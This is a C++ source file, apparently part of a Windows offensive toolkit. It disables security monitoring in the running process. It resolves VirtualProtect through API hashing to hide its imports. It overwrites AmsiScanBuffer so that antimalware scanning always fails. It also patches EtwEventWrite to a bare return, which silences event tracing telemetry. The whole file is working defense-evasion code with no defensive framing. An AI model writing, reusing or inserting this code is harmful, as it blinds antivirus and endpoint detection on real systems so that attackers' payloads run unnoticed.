#include "AmsiEtw.h"
#include "ApiHash.h"
#include "Strings.h"

#include <windows.h>

namespace amisetw {

namespace {

BOOL(WINAPI* g_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) = nullptr;

void ensure_kernel32() {
    if (g_VirtualProtect) return;
    constexpr std::uint32_t k32 = API_HASH("kernel32.dll");
    g_VirtualProtect = api::resolve<decltype(&::VirtualProtect)>(k32, API_HASH("VirtualProtect"));
}

bool patch_bytes(void* fn, const unsigned char* patch, std::size_t len) {
    if (!g_VirtualProtect || !fn) return false;
    DWORD oldp = 0;
    if (!g_VirtualProtect(fn, len, PAGE_EXECUTE_READWRITE, &oldp)) return false;
    memcpy(fn, patch, len);
    DWORD tmp = 0;
    g_VirtualProtect(fn, len, oldp, &tmp);
    return true;
}

void patch_amsi() {
    // AmsiScanBuffer -> mov eax, E_INVALIDARG (0x80070057); ret
    // x64: B8 57 00 07 80 C3
    constexpr std::uint32_t amsi = API_HASH("amsi.dll");
    void* fn = api::export_by_hash(amsi, API_HASH("AmsiScanBuffer"));
    if (!fn) return; // amsi.dll may not be loaded yet; skip silently
    static const unsigned char p[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    patch_bytes(fn, p, sizeof(p));
}

void patch_etw() {
    // ntdll!EtwEventWrite -> ret  (silences ETW event emission)
    constexpr std::uint32_t ntdll = API_HASH("ntdll.dll");
    void* fn = api::export_by_hash(ntdll, API_HASH("EtwEventWrite"));
    if (!fn) return;
    static const unsigned char p[] = { 0xC3 };
    patch_bytes(fn, p, sizeof(p));
}

} // namespace

void patch() {
    ensure_kernel32();
    patch_amsi();
    patch_etw();
}

} // namespace amisetw
